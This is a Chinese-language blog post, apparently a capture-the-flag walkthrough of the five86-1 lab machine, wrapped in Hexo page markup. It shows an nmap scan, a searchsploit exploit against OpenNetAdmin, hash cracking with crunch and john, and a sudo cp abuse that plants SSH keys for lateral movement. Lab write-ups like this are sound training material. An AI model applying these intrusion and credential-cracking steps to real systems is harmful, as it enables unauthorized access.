@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    five86-1 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-bzi777" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      five86-1
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/05/11/bzi777/" class="article-date">
+  <time datetime="2020-05-11T01:33:50.000Z" itemprop="datePublished">2020-05-11</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>nmap -A -p- 扫描端口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589160893102-8d8dbe14-90f4-4f05-b4ec-76295b56e355.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&name=image.png&originHeight=677&originWidth=1020&size=160610&status=done&style=none&width=560" alt="image.png"></p>
+<p>访问一下，哎，这不是 openadmin 嘛</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589161629187-b30dc79c-45fb-478c-a089-159949e14435.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&name=image.png&originHeight=446&originWidth=1920&size=114227&status=done&style=stroke&width=746" alt="image.png"></p>
+<p>searchsploit opennetadmin，然后把搜出来的那个复制出来 searchsploit -m 47691</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589161697320-e0015be7-a383-4f73-8edc-25ab8f1b76e1.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=341&originWidth=983&size=79462&status=done&style=none&width=671" alt="image.png"></p>
+<p>可能会有些问题，复制出来一份给他权限再执行就没问题了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589161982507-84e82ad7-a5bd-4182-832e-c7413b121532.png#align=left&display=inline&height=270&margin=%5Bobject%20Object%5D&name=image.png&originHeight=406&originWidth=619&size=45566&status=done&style=none&width=410" alt="image.png"></p>
+<p>find / -type f -user www-data</p>
+<p>看一下，那些文件是  www-data  可以读的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589162986833-97fd747a-e204-4ae3-8b5c-af75c7132581.png#align=left&display=inline&height=406&margin=%5Bobject%20Object%5D&name=image.png&originHeight=474&originWidth=330&size=39867&status=done&style=none&width=282" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589163056380-eaaa1567-5556-4c73-bc95-8680840219af.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=802&size=44133&status=done&style=none&width=571" alt="image.png"></p>
+<p>得到 douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1  保存为  hash.txt<br>同时提到是 10 位数的密码，所以  crunch 10 10 aefhrt &gt; dict.txt<br>john  爆破一下  john –wordlist=dict.txt hash.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589164167540-399ab0a2-59ed-45cd-8705-541cb37ea502.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=233&originWidth=1017&size=68182&status=done&style=none&width=660" alt="image.png"></p>
+<p>douglas:fatherrrrr    ssh  登录一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589164240960-b17cc393-3dc8-4fe1-bfa3-63093e84470c.png#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&name=image.png&originHeight=315&originWidth=817&size=92952&status=done&style=none&width=590" alt="image.png"></p>
+<p>sudo -l  看一下，发现可以不用密码来执行  jen  用户的  cp</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589164323611-28f5b71c-116f-4a9a-9de4-92591d84c8a2.png#align=left&display=inline&height=104&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=1073&size=33978&status=done&style=none&width=711" alt="image.png"></p>
+<p>ssh-keygen -t rsa<br>cp /home/douglas/.ssh/hack.pub /tmp/authorized_keys<br>sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589165167431-aa8cccb3-d55b-4b9b-b306-bb1b2e7c4e2d.png#align=left&display=inline&height=284&margin=%5Bobject%20Object%5D&name=image.png&originHeight=567&originWidth=890&size=113395&status=done&style=stroke&width=445" alt="image.png"></p>
+<p>使用刚才生成的密钥登录<br>ssh <a href="mailto:jen@192.168.149.169">jen@192.168.149.169</a> -i /home/douglas/.ssh/hack</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589165359728-358eaca2-7e64-40dc-964f-e64d23e3827a.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=278&originWidth=817&size=64324&status=done&style=none&width=538" alt="image.png"></p>
+<p>看一下右键，他告诉我们 Moss’s password is now Fire!Fire!</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589165436590-4a4fc5a9-5ced-44e0-8fd4-7c774ad5a0a9.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=1076&size=133408&status=done&style=none&width=538" alt="image.png"></p>
+<p>我们 su 切换账户</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589165526227-fcd502c6-8a6f-49e9-9deb-6b3597c3db82.png#align=left&display=inline&height=53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=66&originWidth=317&size=9675&status=done&style=none&width=257" alt="image.png"></p>
+<p>emmmm，好随意</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589165624702-0fbfc326-e660-47f6-a96c-53ccef1531ff.png#align=left&display=inline&height=275&margin=%5Bobject%20Object%5D&name=image.png&originHeight=550&originWidth=1297&size=102169&status=done&style=none&width=649" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1589165677903-53a9786c-8486-4809-be2e-1cf56b305ec7.png#align=left&display=inline&height=78&margin=%5Bobject%20Object%5D&name=image.png&originHeight=108&originWidth=331&size=9776&status=done&style=none&width=235" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/05/11/bzi777/" data-id="ckco53qbb00058ou96yhjh99d" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/05/12/opfhno/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            solidity语法 临时整理发公众号
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/07/nqua9o/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">Ethernaut 11-20</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
